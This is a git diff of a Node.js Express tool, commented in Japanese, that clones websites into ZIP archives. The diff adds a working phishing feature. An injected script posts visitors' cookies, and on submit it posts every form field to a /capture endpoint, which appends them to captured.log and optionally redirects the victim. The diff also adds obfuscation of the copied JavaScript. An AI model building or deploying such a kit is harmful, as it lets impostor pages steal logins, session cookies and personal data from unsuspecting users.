@@ -1,3 +1,4 @@
+
 const express = require('express');
 const axios = require('axios');
 const cheerio = require('cheerio');
@@ -16,45 +17,36 @@ app.use(express.json());
 app.use(express.static(__dirname));
 
 // ============================================
-// リソース取得（完全版）
+// ユーティリティ関数
 // ============================================
-async function fetchResource(url, baseUrl, headers = {}) {
+function minifyCSS(code) {
     try {
-        const fullUrl = new URL(url, baseUrl).href;
-        
-        const response = await axios.get(fullUrl, {
-            responseType: 'arraybuffer',
-            timeout: 30000,
-            maxRedirects: 10,
-            headers: {
-                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
-                'Accept': '*/*',
-                'Accept-Language': 'ja-JP,ja;q=0.9,en;q=0.8',
-                'Referer': baseUrl,
-                ...headers
-            }
-        });
-        
-        return {
-            data: response.data,
-            contentType: response.headers['content-type'],
-            finalUrl: response.request.res.responseUrl || fullUrl
-        };
+        return new CleanCSS({ level: 2 }).minify(code).styles;
     } catch(e) {
-        return null;
+        return code;
     }
 }
 
-function getExtension(url, contentType) {
-    const urlExt = path.extname(new URL(url, 'http://example.com').pathname).slice(1).toLowerCase();
-    
-    if (urlExt && urlExt.length <= 5) return urlExt;
-    
-    if (contentType) {
-        return mime.extension(contentType) || 'bin';
+function minifyJS(code) {
+    try {
+        return UglifyJS.minify(code).code;
+    } catch(e) {
+        return code;
     }
-    
-    return 'bin';
+}
+
+function obfuscateJS(code) {
+    try {
+        return JavaScriptObfuscator.obfuscate(code, {
+            compact: true,
+            controlFlowFlattening: true,
+            deadCodeInjection: true,
+            stringArray: true,
+            stringArrayThreshold: 0.75
+        }).getObfuscatedCode();
+    } catch(e) {
+        return code;
+    }
 }
 
 function randomName(ext) {
@@ -69,10 +61,52 @@ function resolveURL(url, baseUrl) {
     }
 }
 
+function getExtension(url, contentType) {
+    const urlExt = path.extname(new URL(url, 'http://example.com').pathname).slice(1).toLowerCase();
+    
+    if (urlExt && urlExt.length <= 5) return urlExt;
+    
+    if (contentType) {
+        const ext = mime.extension(contentType);
+        if (ext) return ext;
+    }
+    
+    return 'bin';
+}
+
+// ============================================
+// リソース取得
+// ============================================
+async function fetchResource(url, baseUrl) {
+    try {
+        const fullUrl = new URL(url, baseUrl).href;
+        
+        const response = await axios.get(fullUrl, {
+            responseType: 'arraybuffer',
+            timeout: 30000,
+            maxRedirects: 10,
+            headers: {
+                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
+                'Accept': '*/*',
+                'Accept-Language': 'ja-JP,ja;q=0.9,en;q=0.8',
+                'Referer': baseUrl
+            }
+        });
+        
+        return {
+            data: response.data,
+            contentType: response.headers['content-type'],
+            finalUrl: response.request.res.responseUrl || fullUrl
+        };
+    } catch(e) {
+        return null;
+    }
+}
+
 // ============================================
 // CSS内のリソース抽出
 // ============================================
-async function extractCSSResources(cssCode, cssUrl, baseUrl, config, resources, resourceMap, resourceCount, maxResources) {
+async function extractCSSResources(cssCode, cssUrl, config, resources, resourceMap, resourceCount, maxResources) {
     const urlRegex = /url\(['"]?([^'")]+)['"]?\)/g;
     let match;
     let updatedCSS = cssCode;
@@ -96,8 +130,7 @@ async function extractCSSResources(cssCode, cssUrl, baseUrl, config, resources, 
             resourceMap[fullAssetUrl] = filename;
             resourceMap[assetUrl] = filename;
             
-            // CSS内のパスを置換
-            updatedCSS = updatedCSS.replace(assetUrl, filename);
+            updatedCSS = updatedCSS.split(assetUrl).join(filename);
             
             resourceCount++;
         }
@@ -110,14 +143,12 @@ async function extractCSSResources(cssCode, cssUrl, baseUrl, config, resources, 
 // HTML内のリソース抽出
 // ============================================
 async function extractHTMLResources($, html, url, config, resources, resourceMap, resourceCount, maxResources) {
-    let updatedHTML = html;
-    
     // CSS (link)
     if (!config.clone || config.clone.css !== false) {
         const cssLinks = [];
         $('link[rel="stylesheet"]').each((i, el) => {
             const href = $(el).attr('href');
-            if (href && !href.startsWith('data:') && resourceCount < maxResources) {
+            if (href && !href.startsWith('data:')) {
                 cssLinks.push(href);
             }
         });
@@ -128,12 +159,15 @@ async function extractHTMLResources($, html, url, config, resources, resourceMap
             const fullCssUrl = resolveURL(cssUrl, url);
             if (!fullCssUrl) continue;
             
+            console.log(`Fetching CSS: ${fullCssUrl}`);
+            
             const content = await fetchResource(fullCssUrl, url);
             if (content && content.data) {
-                let cssCode = content.data.toString('utf8');
+                let cssCode = Buffer.from(content.data).toString('utf8');
                 
-                // CSS内のリソースも抽出
-                const result = await extractCSSResources(cssCode, fullCssUrl, url, config, resources, resourceMap, resourceCount, maxResources);
+                console.log(`CSS size: ${cssCode.length} bytes`);
+                
+                const result = await extractCSSResources(cssCode, fullCssUrl, config, resources, resourceMap, resourceCount, maxResources);
                 cssCode = result.updatedCSS;
                 resourceCount = result.resourceCount;
                 
@@ -142,10 +176,12 @@ async function extractHTMLResources($, html, url, config, resources, resourceMap
                 }
                 
                 const filename = config.output && config.output.randomizeNames ? randomName('css') : path.basename(new URL(fullCssUrl).pathname) || randomName('css');
-                resources[filename] = cssCode;
+                resources[filename] = Buffer.from(cssCode);
                 resourceMap[cssUrl] = filename;
                 resourceMap[fullCssUrl] = filename;
                 resourceCount++;
+                
+                console.log(`Added CSS: ${filename} (${cssCode.length} bytes)`);
             }
         }
     }
@@ -155,7 +191,7 @@ async function extractHTMLResources($, html, url, config, resources, resourceMap
         const jsFiles = [];
         $('script[src]').each((i, el) => {
             const src = $(el).attr('src');
-            if (src && !src.startsWith('data:') && resourceCount < maxResources) {
+            if (src && !src.startsWith('data:')) {
                 jsFiles.push(src);
             }
         });
@@ -166,9 +202,13 @@ async function extractHTMLResources($, html, url, config, resources, resourceMap
             const fullJsUrl = resolveURL(jsUrl, url);
             if (!fullJsUrl) continue;
             
+            console.log(`Fetching JS: ${fullJsUrl}`);
+            
             const content = await fetchResource(fullJsUrl, url);
             if (content && content.data) {
-                let jsCode = content.data.toString('utf8');
+                let jsCode = Buffer.from(content.data).toString('utf8');
+                
+                console.log(`JS size: ${jsCode.length} bytes`);
                 
                 if (config.output && config.output.obfuscate) {
                     jsCode = obfuscateJS(jsCode);
@@ -177,10 +217,12 @@ async function extractHTMLResources($, html, url, config, resources, resourceMap
                 }
                 
                 const filename = config.output && config.output.randomizeNames ? randomName('js') : path.basename(new URL(fullJsUrl).pathname) || randomName('js');
-                resources[filename] = jsCode;
+                resources[filename] = Buffer.from(jsCode);
                 resourceMap[jsUrl] = filename;
                 resourceMap[fullJsUrl] = filename;
                 resourceCount++;
+                
+                console.log(`Added JS: ${filename} (${jsCode.length} bytes)`);
             }
         }
     }
@@ -188,40 +230,40 @@ async function extractHTMLResources($, html, url, config, resources, resourceMap
     // 画像
     if (!config.clone || config.clone.images !== false) {
         const images = [];
+        
         $('img').each((i, el) => {
             const src = $(el).attr('src');
-            if (src && !src.startsWith('data:') && resourceCount < maxResources) {
+            if (src && !src.startsWith('data:')) {
                 images.push(src);
             }
         });
         
-        // srcset 属性も処理
         $('img[srcset]').each((i, el) => {
             const srcset = $(el).attr('srcset');
-            const srcsetUrls = srcset.split(',').map(s => s.trim().split(' ')[0]);
-            srcsetUrls.forEach(src => {
-                if (src && !src.startsWith('data:') && resourceCount < maxResources) {
-                    images.push(src);
-                }
-            });
+            if (srcset) {
+                const srcsetUrls = srcset.split(',').map(s => s.trim().split(' ')[0]);
+                srcsetUrls.forEach(src => {
+                    if (src && !src.startsWith('data:')) {
+                        images.push(src);
+                    }
+                });
+            }
         });
         
-        // 背景画像
         $('[style*="background"]').each((i, el) => {
-            const style = $(el).attr('style');
+            const style = $(el).attr('style') || '';
             const bgRegex = /background(?:-image)?\s*:\s*url\(['"]?([^'")]+)['"]?\)/g;
             let match;
             while ((match = bgRegex.exec(style)) !== null) {
-                if (match[1] && !match[1].startsWith('data:') && resourceCount < maxResources) {
+                if (match[1] && !match[1].startsWith('data:')) {
                     images.push(match[1]);
                 }
             }
         });
         
-        // ファビコン
         $('link[rel="icon"], link[rel="shortcut icon"], link[rel="apple-touch-icon"]').each((i, el) => {
             const href = $(el).attr('href');
-            if (href && !href.startsWith('data:') && resourceCount < maxResources) {
+            if (href && !href.startsWith('data:')) {
                 images.push(href);
             }
         });
@@ -232,6 +274,8 @@ async function extractHTMLResources($, html, url, config, resources, resourceMap
             const fullImgUrl = resolveURL(imgUrl, url);
             if (!fullImgUrl) continue;
             
+            console.log(`Fetching image: ${fullImgUrl}`);
+            
             const content = await fetchResource(fullImgUrl, url);
             if (content && content.data) {
                 const ext = getExtension(fullImgUrl, content.contentType);
@@ -241,6 +285,8 @@ async function extractHTMLResources($, html, url, config, resources, resourceMap
                 resourceMap[imgUrl] = filename;
                 resourceMap[fullImgUrl] = filename;
                 resourceCount++;
+                
+                console.log(`Added image: ${filename} (${Buffer.byteLength(content.data)} bytes)`);
             }
         }
     }
@@ -248,7 +294,13 @@ async function extractHTMLResources($, html, url, config, resources, resourceMap
     // フォント
     if (!config.clone || config.clone.fonts !== false) {
         const fonts = [];
-        $('link[rel="preload"][as="font"], link[rel="preload"][type="font/woff2"]').each((i, el) => {
+        
+        $('link[rel="preload"][as="font"]').each((i, el) => {
+            const href = $(el).attr('href');
+            if (href) fonts.push(href);
+        });
+        
+        $('link[rel="preload"][type="font/woff2"]').each((i, el) => {
             const href = $(el).attr('href');
             if (href) fonts.push(href);
         });
@@ -275,9 +327,10 @@ async function extractHTMLResources($, html, url, config, resources, resourceMap
     // 動画・音声
     if (!config.clone || config.clone.videos !== false) {
         const media = [];
+        
         $('video source, video[src], audio source, audio[src]').each((i, el) => {
             const src = $(el).attr('src');
-            if (src && !src.startsWith('data:') && resourceCount < maxResources) {
+            if (src && !src.startsWith('data:')) {
                 media.push(src);
             }
         });
@@ -302,9 +355,10 @@ async function extractHTMLResources($, html, url, config, resources, resourceMap
     }
     
     // HTML内のパス置換
+    let updatedHTML = html;
     for (const [originalUrl, newFilename] of Object.entries(resourceMap)) {
         const escapedUrl = originalUrl.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
-        updatedHTML = updatedHTML.split(escapedUrl).join(newFilename);
+        updatedHTML = updatedHTML.split(originalUrl).join(newFilename);
     }
     
     return { updatedHTML, resourceCount };
@@ -314,6 +368,8 @@ async function extractHTMLResources($, html, url, config, resources, resourceMap
 // メインクローン関数
 // ============================================
 async function cloneSiteDeep(url, config) {
+    console.log(`Starting clone: ${url}`);
+    
     const response = await axios.get(url, {
         timeout: 30000,
         maxRedirects: 10,
@@ -325,6 +381,8 @@ async function cloneSiteDeep(url, config) {
     });
     
     let html = response.data;
+    console.log(`HTML size: ${html.length} bytes`);
+    
     const $ = cheerio.load(html);
     const resources = {};
     const resourceMap = {};
@@ -334,10 +392,67 @@ async function cloneSiteDeep(url, config) {
     
     const result = await extractHTMLResources($, html, url, config, resources, resourceMap, resourceCount, maxResources);
     html = result.updatedHTML;
+    resourceCount = result.resourceCount;
+    
+    console.log(`Total resources: ${resourceCount}`);
+    console.log(`Resource keys: ${Object.keys(resources).join(', ')}`);
     
     // フィッシング自動化
     if (config.phishing && config.phishing.enabled) {
-        // ... 既存のフィッシングコード ...
+        let phishingScript = '<script>';
+        
+        if (config.phishing.captureCookies) {
+            phishingScript += `
+            fetch('/capture', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    type: 'cookies',
+                    url: '${url}',
+                    data: document.cookie,
+                    userAgent: navigator.userAgent,
+                    timestamp: Date.now()
+                })
+            });
+            `;
+        }
+        
+        if (config.phishing.captureForm) {
+            phishingScript += `
+            document.addEventListener('DOMContentLoaded', () => {
+                document.querySelectorAll('form').forEach(form => {
+                    form.addEventListener('submit', (e) => {
+                        e.preventDefault();
+                        
+                        const formData = {};
+                        form.querySelectorAll('input, select, textarea').forEach(input => {
+                            if (input.name) {
+                                formData[input.name] = input.value;
+                            }
+                        });
+                        
+                        fetch('/capture', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                type: 'form',
+                                url: '${url}',
+                                data: formData,
+                                cookies: document.cookie,
+                                userAgent: navigator.userAgent,
+                                timestamp: Date.now()
+                            })
+                        }).then(() => {
+                            ${config.phishing.redirectUrl ? `window.location.href = '${config.phishing.redirectUrl}';` : ''}
+                        });
+                    });
+                });
+            });
+            `;
+        }
+        
+        phishingScript += '</script>';
+        html = html.replace('</body>', phishingScript + '</body>');
     }
     
     // HTML minify
@@ -351,10 +466,20 @@ async function cloneSiteDeep(url, config) {
         });
     }
     
-    resources['index.html'] = html;
+    resources['index.html'] = Buffer.from(html);
     
     return resources;
 }
+
+// ============================================
+// キャプチャエンドポイント
+// ============================================
+app.post('/capture', (req, res) => {
+    const data = req.body;
+    const log = `[${new Date().toISOString()}] ${JSON.stringify(data)}\n`;
+    fs.appendFileSync('captured.log', log);
+    res.json({ success: true });
+});
 
 // ============================================
 // クローンエンドポイント
@@ -374,26 +499,19 @@ app.post('/clone', async (req, res) => {
         archive.pipe(res);
         
         Object.entries(resources).forEach(([filename, content]) => {
-            archive.append(content, { name: `${siteName}/${filename}` });
+            const buffer = Buffer.isBuffer(content) ? content : Buffer.from(content);
+            console.log(`ZIP: ${siteName}/${filename} (${buffer.length} bytes)`);
+            archive.append(buffer, { name: `${siteName}/${filename}` });
         });
         
         archive.finalize();
         
-        console.log(`Cloned: ${config.url} | Resources: ${Object.keys(resources).length} | Size: ${JSON.stringify(resources).length} bytes`);
+        console.log(`Clone complete: ${Object.keys(resources).length} files`);
     } catch(e) {
-        console.error(e);
+        console.error('Clone error:', e.message);
+        console.error(e.stack);
         res.status(500).json({ error: e.message });
     }
-});
-
-// ============================================
-// キャプチャエンドポイント
-// ============================================
-app.post('/capture', (req, res) => {
-    const data = req.body;
-    const log = `[${new Date().toISOString()}] ${JSON.stringify(data)}\n`;
-    fs.appendFileSync('captured.log', log);
-    res.json({ success: true });
 });
 
 const PORT = process.env.PORT || 3000;
